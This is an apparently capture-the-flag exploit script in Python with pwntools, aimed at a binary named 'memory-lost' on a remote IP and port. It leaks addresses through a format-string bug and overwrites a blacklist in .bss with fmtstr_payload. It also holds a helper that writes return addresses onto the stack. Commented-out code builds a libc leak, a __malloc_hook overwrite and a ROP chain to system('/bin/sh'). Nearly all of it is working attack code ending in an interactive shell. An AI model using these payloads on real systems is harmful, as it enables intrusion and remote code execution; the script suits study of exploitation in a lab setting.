#!/usr/bin/env python3

from pwn import *

exe = ELF("./memory-lost_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so")
# context.terminal = ['tmux', 'splitw', '-h']

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("178.128.29.224", 9481)

    return r

def kirimStack(ya,rip_stack,r):

    chunks = [
    (ya >> (16 * 0)) & 0xffff,  # 0x8008
    (ya >> (16 * 1)) & 0xffff,  # 0x5555
    (ya >> (16 * 2)) & 0xffff,  # 0x5555
    (ya >> (16 * 3)) & 0xffff   # 0x0000
    
]
    ovt_sthck = fmtstr_payload(8,{rip_stack: chunks[0]},write_size='short')
    ovt_sthck2 = fmtstr_payload(8,{rip_stack + 2: chunks[1]},write_size='short')
    ovt_sthck3 = fmtstr_payload(8,{rip_stack + 4: chunks[2]},write_size='short')
    ovt_sthck4 = fmtstr_payload(8,{rip_stack + 6: chunks[3]},write_size='short')
    r.sendline(ovt_sthck)
    r.sendline(ovt_sthck2)
    r.sendline(ovt_sthck3)
    r.sendline(ovt_sthck4)

def main():
    # good luck pwning :)
    r = conn()
    log.info("===== LETS FIX THE PIE (BASE ADDRESS) =====")
    r.sendline("%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d")
    r.recvuntil(b"-------------------------------------------\n\n")  # Wait for delimiter
    output = r.recvline()
    numbers = [int(x) for x in output.decode().split()]
    
    # Extract the 41st element (0-based index 40)
    leak_addr = numbers[40] + 93823560581120
    log.info(f"Leaked address: {hex(leak_addr)}")
    exe.address = leak_addr - 0x16f7
    log.info(hex(exe.address))
    blacklist = exe.address + 0x4010
    log.info(f"The address of bss where black list store: {hex(blacklist)}")
    fix_blacklist = fmtstr_payload(8,{blacklist: 0xa},write_size='short',no_dollars=True)
    # fix_blacklist = b"%d %d %d %d %d %d %d %n" + p64(exe.address)
    log.info(f"Alamat Blacklist : {hex(blacklist)}")
    log.info(f"Panjang payload : {len(fix_blacklist)} === {fix_blacklist}")
    r.sendline(fix_blacklist)
    # r.sendline("%47$p")
    # r.recvuntil(b'Try to think again... what do you remember?\n')
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline()}")
    # libc_start_main_leak = int(r.recvline().strip().decode(),16)
    # libc.address = libc_start_main_leak - 0x29d90
    # log.info(f"LIBC START MAIN LEAK = {hex(libc_start_main_leak)}")
    # log.info(f"LIBC ADRESS = {hex(libc.address)}")
    # log.info(f"LIBC BASE {hex(libc.address)}")
    # gadget = libc.address + 0xebc81
    # __malloc_hook = libc.address + 0x2214a0
    # log.info(f"__malloc_hook : {hex(__malloc_hook)}")
    # overwrite_malloc_hook = fmtstr_payload(8,{__malloc_hook: gadget},write_size='int')
    # log.info(f"Size of overwrite malloc hook : {len(overwrite_malloc_hook)} --> {overwrite_malloc_hook}")
    # r.sendline(overwrite_malloc_hook)
    # r.sendline(b'%1000000000000000000c')
    # sleep(15)
    # r.sendline("%5$p")
    # r.recvuntil(b"Try to think again... what do you remember?\n")
    # leak_stack = int(r.recvline().strip().decode(),16)
    # rip_stack = leak_stack + 0x658
    # print(hex(rip_stack))

    # gdb.attach(r, '''
    # echo "hi"
    # break *0x55555555569e
    # addr = 0x5555555554dd
    # ret = exe.address + 0x000000000000101a
    # rop = ROP(libc)
    # pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
    # bin_sh = next(libc.search(b"/bin/sh\x00"))
    # system = libc.sym['system']
    # kirimStack(pop_rdi,rip_stack,r)
    # kirimStack(bin_sh,rip_stack + 8,r)
    # kirimStack(ret,rip_stack + 16,r)
    # # sleep(15)
    # kirimStack(system,rip_stack + 24,r)
#     chunks = [
#     (ret >> (16 * 0)) & 0xffff,  # 0x8008
#     (ret >> (16 * 1)) & 0xffff,  # 0x5555
#     (ret >> (16 * 2)) & 0xffff,  # 0x5555
#     (ret >> (16 * 3)) & 0xffff   # 0x0000
# ]

#     chunks2 = [
#         (addr >> (16 * 0)) & 0xffff,  # 0x8008
#         (addr >> (16 * 1)) & 0xffff,  # 0x5555
#         (addr >> (16 * 2)) & 0xffff,  # 0x5555
#         (addr >> (16 * 3)) & 0xffff   # 0x0000
#     ]
# Build address-to-value map
    # sthck = rip_stack
    # trampoline_main = exe.address + 0x14dd
    # log.info(f"TRAMPOLINE ADDRESS : {hex(trampoline_main)}")
    # ovt_sthck = fmtstr_payload(8,{sthck: 0x00005555},write_size='short')
    # print(ovt_sthck)
    # ovt_sthck2 = fmtstr_payload(8,{sthck - 4 : 0x555554dd},write_size='short')
    # print(ovt_sthck2)
    # log.info(f"SIZE OF TRAMPOLINE OVERWRITE : {size(ovt_sthck)}")
    # log.info(f"SIZE OF TRAMPOLINE OVERWRITE 2: {size(ovt_sthck2)}")
    # log.info(f"The ovt_sthck1 payload : {ovt_sthck}")
    # r.sendline(ovt_sthck)
    # r.sendline(ovt_sthck2)
    # continue
    # ''')  # Use tmux
    # print(hex(chunks[0]))
    # ovt_sthck = fmtstr_payload(8,{rip_stack: chunks[0]},write_size='short')
    # ovt_sthck2 = fmtstr_payload(8,{rip_stack + 2: chunks[1]},write_size='short')
    # ovt_sthck3 = fmtstr_payload(8,{rip_stack + 4: chunks[2]},write_size='short')
    # ovt_sthck4 = fmtstr_payload(8,{rip_stack + 6: chunks[3]},write_size='short')
    # r.sendline(ovt_sthck)
    # r.sendline(ovt_sthck2)
    # r.sendline(ovt_sthck3)
    # r.sendline(ovt_sthck4)
    # rip_stack2 = 0x7fffffffde30
    # print(hex(chunks2[0]))
    # ovt_sthck = fmtstr_payload(8,{rip_stack2: chunks2[0]},write_size='short')
    # ovt_sthck2 = fmtstr_payload(8,{rip_stack2 + 2: chunks2[1]},write_size='short')
    # ovt_sthck3 = fmtstr_payload(8,{rip_stack2 + 4: chunks2[2]},write_size='short')
    # ovt_sthck4 = fmtstr_payload(8,{rip_stack2 + 6: chunks2[3]},write_size='short')
    # r.sendline(ovt_sthck)
    # r.sendline(ovt_sthck2)
    # r.sendline(ovt_sthck3)
    # r.sendline(ovt_sthck4)
    # print(chunks2)
    # sleep(15)
    # ovt_sthck4 = fmtstr_payload(8,{rip_stack + 6: chunks2[3]},write_size='short')
    # write("payload",fix_blacklist)
    # r.sendline(b"I remember everything!")
    r.interactive()

 # 0x555555557f90 puts(got)
if __name__ == "__main__":
    main()

# 0x555555554000: 0x00010102464c457f  
# 0x555555554000: 0x00010102464c457f      0x0000000000000000

#global variable : 11

# RIP = 0x7fffffffdcb8
# idk_leak_random = 0x7fffffffdd70

# 0x7fffffffdd70 stack addr before exiting main()
